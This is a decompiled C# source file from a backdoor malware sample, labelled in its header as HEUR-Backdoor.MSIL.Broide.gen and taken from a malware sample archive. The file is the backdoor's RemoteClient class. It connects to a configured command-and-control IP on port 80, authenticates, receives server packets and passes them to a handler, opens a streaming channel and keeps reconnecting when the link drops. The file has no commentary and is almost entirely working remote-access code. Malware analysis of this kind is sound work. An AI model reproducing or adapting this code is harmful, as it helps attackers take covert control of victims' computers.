// Decompiled with JetBrains decompiler
// Type: RemoteClient.RemoteClient
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using RemoteClient.Packets;
using RemoteClient.Packets.Server;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace RemoteClient
{
  public class RemoteClient : IDisposable
  {
    private static object dislock = new object();
    private byte[] delimiter = Encoding.ASCII.GetBytes("<EOF>");
    public byte[] buff = new byte[1024];
    public Socket tcpSocket;
    public Streaming streamClass;
    public byte[] id;
    public bool clientState;

    public RemoteClient(Socket Param_358)
    {
      this.tcpSocket = Param_358;
      this.clientState = true;
      new Thread(new ThreadStart(this.method_144)).Start();
      this.tcpSocket.BeginReceive(this.buff, 0, this.buff.Length, SocketFlags.None, new AsyncCallback(this.ReceiveCallback), (object) this.tcpSocket);
    }

    private void method_144()
    {
      while (this.clientState)
      {
        try
        {
          if (this.tcpSocket.Poll(1000, SelectMode.SelectRead) & this.tcpSocket.Available == 0)
          {
            this.clientState = false;
            this.Dispose();
            return;
          }
          if (!Program.needReconnect)
            return;
          Thread.Sleep(500);
        }
        catch
        {
          if (!Program.needReconnect)
            return;
        }
      }
      this.Dispose();
    }

    public void Auth()
    {
      RemoteClient.Packets.Client.Packets.Auth auth = new RemoteClient.Packets.Client.Packets.Auth();
      this.id = auth.id;
      auth.Execute(Connection.RemoteClient_2);
    }

    public void AuthStream()
    {
      while (true)
      {
        try
        {
          RemoteClient.Packets.Client.Packets.Auth auth = new RemoteClient.Packets.Client.Packets.Auth();
          Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          if (!(Config.retip == ""))
            socket.Connect((EndPoint) new IPEndPoint(IPAddress.Parse(Config.retip), 80));
          else
            socket.Connect((EndPoint) new IPEndPoint(IPAddress.Parse(Config.ip), 80));
          this.tcpSocket.NoDelay = true;
          List<byte> list = auth.ToList();
          list.AddRange((IEnumerable<byte>) this.delimiter);
          socket.Send(list.ToArray());
          socket.ReceiveTimeout = 7000;
          socket.Receive(new byte[1]);
          if (this.streamClass != null)
          {
            this.streamClass.Dispose();
            this.streamClass = (Streaming) null;
          }
          this.streamClass = new Streaming(socket);
          break;
        }
        catch (Exception ex)
        {
          Helpers.BrowserLogging("Error on Socket conection " + ex.ToString());
        }
      }
    }

    public void Send(RemoteClient.Packets.Client.Packets.IPacket Param_363)
    {
      try
      {
        lock (new object())
        {
          if ((!this.clientState ? 0 : (Param_363 != null ? 1 : 0)) == 0)
            return;
          try
          {
            List<byte> byteList = Param_363.Vmethod_185();
            byteList.AddRange((IEnumerable<byte>) this.delimiter);
            this.tcpSocket.Send(byteList.ToArray(), byteList.Count, SocketFlags.None);
          }
          catch
          {
          }
        }
      }
      catch
      {
        this.Dispose();
      }
    }

    public void ReceiveCallback(IAsyncResult Param_365)
    {
      try
      {
        if (!this.clientState)
          return;
        Socket asyncState = (Socket) Param_365.AsyncState;
        try
        {
          if (asyncState.EndReceive(Param_365) > 0)
            PacketsHandler.HandlePackets(this, ServerPackets.BuildPacket(this.buff));
        }
        catch
        {
        }
        this.SendEcho();
        asyncState.BeginReceive(this.buff, 0, this.buff.Length, SocketFlags.None, new AsyncCallback(this.ReceiveCallback), (object) this.tcpSocket);
      }
      catch
      {
      }
    }

    private void SendEcho() => this.tcpSocket.Send(new byte[1]
    {
      (byte) 228
    });

    public void Dispose()
    {
      lock (RemoteClient.RemoteClient.dislock)
      {
        try
        {
          this.clientState = false;
          this.tcpSocket.Shutdown(SocketShutdown.Both);
          this.tcpSocket.Close();
          this.tcpSocket.Dispose();
          try
          {
            this.streamClass.StopStream = true;
            Thread.Sleep(1000);
            if (this.streamClass.tcpStream != null)
            {
              this.streamClass.tcpStream.Shutdown(SocketShutdown.Both);
              this.streamClass.tcpStream.Close();
              this.streamClass.tcpStream.Dispose();
              this.streamClass.tcpStream = (Socket) null;
            }
            this.tcpSocket = (Socket) null;
          }
          catch
          {
          }
          this.buff = (byte[]) null;
          this.id = (byte[]) null;
          GC.Collect();
        }
        catch
        {
        }
      }
    }
  }
}
